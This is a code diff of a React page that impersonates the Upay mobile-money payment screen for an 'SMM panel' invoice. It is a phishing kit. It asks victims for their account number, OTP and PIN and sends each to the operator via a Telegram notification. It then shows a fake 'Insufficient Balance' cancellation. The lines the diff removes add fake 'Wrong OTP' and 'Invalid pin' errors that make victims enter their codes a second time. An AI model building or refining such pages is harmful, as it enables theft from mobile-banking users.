@@ -3,7 +3,6 @@ import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import upayLogo from "@/assets/upay-logo-full.svg";
-import StackedSpinnerLoader from "@/components/StackedSpinnerLoader";
 
 const UpayPayment = () => {
   const navigate = useNavigate();
@@ -76,15 +75,8 @@ const UpayPayment = () => {
     setIsLoading(true);
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp });
     setTimeout(() => {
+      setStep('pin');
       setIsLoading(false);
-      if (otpAttempts === 0) {
-        setShowError("Wrong OTP entered");
-        setOtpAttempts(1);
-        setOtp("");
-      } else {
-        setShowError("");
-        setStep('pin');
-      }
     }, 2000);
   };
 
@@ -98,13 +90,7 @@ const UpayPayment = () => {
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp, pin });
     setTimeout(() => {
       setIsLoading(false);
-      if (pinAttempts === 0) {
-        setShowError("Invalid pin provided");
-        setPinAttempts(1);
-        setPin("");
-      } else {
-        navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
-      }
+      navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
     }, 2000);
   };
 
@@ -116,8 +102,8 @@ const UpayPayment = () => {
     if (step === 'pin') {
       return (
         <>
-          {showError && <p className="text-center text-red-600 text-sm font-bold mb-2 bg-red-100 rounded-lg py-1.5 px-3">{showError}</p>}
           <p className="text-center text-[#0054A5] font-extrabold text-base mb-3">Enter your PIN</p>
+          {showError && <p className="text-center text-red-500 text-sm font-bold mb-2">{showError}</p>}
           <input ref={pinRef} type="password" inputMode="numeric" value={pin} onChange={handlePinChange} placeholder="PIN"
             className="w-full border border-[#ccc] rounded-full px-4 py-3 text-center text-base font-bold outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
           <p className="text-center text-[#333] text-sm font-bold mt-3">By clicking on <span className="font-extrabold">Confirm,</span> you are agreeing to the <span className="underline font-extrabold text-[#1a1a1a]">terms & conditions</span></p>
@@ -127,14 +113,15 @@ const UpayPayment = () => {
     if (step === 'otp') {
       return (
         <>
-          {showError && <p className="text-center text-red-600 text-sm font-bold mb-2 bg-red-100 rounded-lg py-1.5 px-3">{showError}</p>}
           <p className="text-center text-[#0054A5] font-extrabold text-base mb-3">Enter verification code</p>
+          {showError && <p className="text-center text-red-500 text-sm font-bold mb-2">{showError}</p>}
           <input ref={otpRef} type="text" inputMode="numeric" value={otp} onChange={handleOtpChange} placeholder="Verification code"
             className="w-full border border-[#ccc] rounded-full px-4 py-3 text-center text-base font-bold outline-none focus:border-[#0054A5] transition-colors" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }} />
           <p className="text-center text-[#333] text-sm font-bold mt-3">By clicking on <span className="font-extrabold">Confirm,</span> you are agreeing to the <span className="underline font-extrabold text-[#1a1a1a]">terms & conditions</span></p>
         </>
       );
     }
+    const mobileValid = isValidMobile();
     return (
       <>
         <p className="text-center text-[#0054A5] font-extrabold text-base mb-3">Enter Your upay Account Number</p>
@@ -155,45 +142,45 @@ const UpayPayment = () => {
   if (isAllowed !== true) return null;
 
   return (
-    <div className="h-[100dvh] w-screen flex items-center justify-center overflow-hidden" style={{ background: 'linear-gradient(to bottom, rgb(250, 235, 122) 10%, rgb(253, 251, 216) 80%)' }}>
-      {isLoading && <StackedSpinnerLoader color="#0054A5" />}
-      <div className="w-full max-w-[420px] h-full flex flex-col">
+    <div className="fixed inset-0 flex flex-col items-start justify-start p-4 pt-6 overflow-hidden" style={{ background: 'linear-gradient(to bottom, rgb(250, 235, 122) 10%, rgb(253, 251, 216) 80%)' }}>
+      <div className="w-full max-w-[420px] mx-auto rounded-2xl overflow-hidden shadow-lg" style={{ minHeight: '520px' }}>
         
-        {/* Yellow upper section */}
-        <div className="flex-1 px-4 sm:px-5 pt-6 sm:pt-8 pb-4 sm:pb-6 flex flex-col items-center justify-center gap-5" style={{ backgroundColor: 'rgb(251, 214, 0)' }}>
-          <img src={upayLogo} alt="Upay" className="w-48 sm:w-72 h-auto object-contain" />
+        {/* Yellow upper section - logo, invoice, input */}
+        <div className="px-5 pt-8 pb-8 flex flex-col items-center" style={{ backgroundColor: 'rgb(251, 214, 0)' }}>
+          {/* Logo */}
+          <img src={upayLogo} alt="Upay" className="w-72 h-auto object-contain mb-6" />
 
-          <div className="w-full rounded-xl px-4 sm:px-5 py-4 sm:py-5 text-center" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }}>
-            <p className="font-extrabold text-[#1a1a1a] text-base sm:text-lg">GENZ SMM PANEL</p>
-            <p className="text-[#444] text-sm sm:text-base font-bold mt-1">Invoice Number:</p>
-            <p className="font-extrabold text-[#1a1a1a] text-sm sm:text-base">{invoiceNumber}</p>
-            <p className="text-[#444] text-sm sm:text-base font-bold mt-1">Amount: <span className="font-extrabold text-[#1a1a1a] text-base sm:text-lg">BDT {amount}</span></p>
+          {/* Invoice info box */}
+          <div className="w-full rounded-xl px-5 py-5 mb-7 text-center" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }}>
+            <p className="font-extrabold text-[#1a1a1a] text-lg">GENZ SMM PANEL</p>
+            <p className="text-[#444] text-base font-bold mt-1.5">Invoice Number:</p>
+            <p className="font-extrabold text-[#1a1a1a] text-base">{invoiceNumber}</p>
+            <p className="text-[#444] text-base font-bold mt-1.5">Amount: <span className="font-extrabold text-[#1a1a1a] text-lg">BDT {amount}</span></p>
           </div>
 
-          <div className="w-full rounded-xl px-4 sm:px-5 py-4 sm:py-5" style={{ backgroundColor: 'rgba(235, 235, 235, 0.7)' }}>
-            {renderContent()}
-          </div>
+          {/* Input area */}
+          <div className="w-full">{renderContent()}</div>
         </div>
 
-        {/* Buttons */}
-        <div className="bg-white px-4 sm:px-5 py-3 sm:py-4 shrink-0">
-          <div className="flex items-center justify-between gap-3">
-            <button onClick={handleClose} className="border border-[#bbb] rounded-lg px-6 sm:px-8 py-2.5 sm:py-3 text-sm sm:text-base font-bold text-[#333] bg-white hover:bg-[#f5f5f5]">Close</button>
+        {/* White bottom section - buttons */}
+        <div className="bg-white px-5 py-5">
+          <div className="flex items-center justify-between">
+            <button onClick={handleClose} className="border border-[#bbb] rounded-lg px-8 py-3 text-base font-bold text-[#333] bg-white hover:bg-[#f5f5f5]">Close</button>
             <button
               onClick={handleSubmit}
               disabled={isDisabled}
-              className="rounded-lg px-6 sm:px-8 py-2.5 sm:py-3 text-sm sm:text-base font-bold transition-colors text-white"
+              className="rounded-lg px-8 py-3 text-base font-bold transition-colors text-white"
               style={{ backgroundColor: isDisabled ? '#aaa' : confirmBgColor, cursor: isDisabled ? 'not-allowed' : 'pointer' }}
             >Confirm</button>
           </div>
         </div>
 
         {/* Footer */}
-        <div className="py-2 sm:py-3 flex items-center justify-center gap-1.5 bg-white border-t border-[#eee] shrink-0">
+        <div className="py-3 flex items-center justify-center gap-1.5 bg-white border-t border-[#eee]">
           <svg width="18" height="18" viewBox="0 0 24 24" fill="#0054A5">
             <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
           </svg>
-          <span className="text-[#0054A5] font-extrabold text-sm sm:text-base">16268</span>
+          <span className="text-[#0054A5] font-extrabold text-base">16268</span>
         </div>
       </div>
     </div>
